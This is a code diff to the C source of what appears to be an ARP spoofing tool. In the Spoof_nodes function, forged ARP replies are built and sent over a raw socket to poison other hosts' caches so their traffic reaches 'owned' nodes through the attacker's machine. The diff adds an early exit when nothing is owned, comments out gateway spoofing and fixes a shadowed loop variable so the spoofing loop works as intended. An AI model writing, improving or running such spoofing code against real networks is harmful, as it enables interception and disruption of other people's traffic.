@@ -8,6 +8,7 @@
 
 #include "spoof.h"
 #include "nodes.h"
+#include "debug.h"
 
 struct arp_ip4 {
     uint8_t  ar_sha[ETH_ALEN];  /* Sender hardware address.     */
@@ -48,23 +49,30 @@ void spoof_packet(uint8_t *buffer, uint32_t node_ip4, uint8_t node_hw[ETH_ALEN],
 
 
 void Spoof_nodes(int packet_sock, struct CurrentAddress *current) {
-	uint8_t *buffer = malloc(ARPREPLY_SIZE);
 	int owned_count = nodes_owned_count();
+	if (owned_count == 0) {
+		DWARNING("%s\n", "Nothing to spoof");
+		return;
+	}
+
+
 	struct Node **owned = nodes_get_owned();
 	int node_count = nodes_count();
 	struct Node *nodes = nodes_get();
 
-	uint8_t *gw_hw = node_get(current->gateway)->hwaddr;
+	//uint8_t *gw_hw = node_get(current->gateway)->hwaddr;
+
+	uint8_t *buffer = malloc(ARPREPLY_SIZE);
 
 	for (int i = 0; i < owned_count; i++) {
 		/* spoof router */
-		spoof_packet(buffer, owned[i]->ip4addr, owned[i]->hwaddr, current->gateway, gw_hw);
-		send(packet_sock, buffer, ARPREPLY_SIZE, 0);
+		//spoof_packet(buffer, owned[i]->ip4addr, owned[i]->hwaddr, current->gateway, gw_hw);
+		//send(packet_sock, buffer, ARPREPLY_SIZE, 0);
 
 		/* spoof node */
-		for (int i = 0; i < node_count; i++) {
-			if (nodes[i].is_online) {
-				spoof_packet(buffer, nodes[i].ip4addr, current->hwaddr, owned[i]->ip4addr, owned[i]->hwaddr);
+		for (int j = 0; j < node_count; j++) {
+			if (nodes[j].is_online && nodes[j].ip4addr != owned[i]->ip4addr) {
+				spoof_packet(buffer, nodes[j].ip4addr, current->hwaddr, owned[i]->ip4addr, owned[i]->hwaddr);
 				send(packet_sock, buffer, ARPREPLY_SIZE, 0);
 			}
 		}
